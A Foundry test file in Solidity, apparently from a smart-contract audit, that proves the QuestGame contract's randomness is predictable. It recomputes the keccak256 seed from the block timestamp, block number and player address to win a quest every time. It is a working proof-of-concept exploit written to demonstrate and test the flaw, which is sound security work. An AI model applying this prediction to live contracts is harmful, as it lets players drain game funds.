
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {
    QuestGame public questGame;
    address public player = address(0x123);

    function setUp() public {
        vm.deal(address(this), 10 ether);
        questGame = new QuestGame{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockTimestamp >= 3600);
        vm.assume(blockNumber > 0);
        vm.assume(blockTimestamp <= type(uint256).max - 1000);
        vm.assume(blockNumber <= type(uint256).max - 1000);

        vm.deal(player, 1 ether);
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    blockTimestamp,
                    blockNumber,
                    player
                )
            )
        );
        uint256 expectedNumber = seed % 100;

        vm.prank(player);
        questGame.attemptQuest{value: 0.1 ether}(expectedNumber);

        (uint256 exp, uint256 wins) = questGame.getPlayerStats(player);
        assertEq(wins, 1);
        assertEq(exp, 100);
    }
}
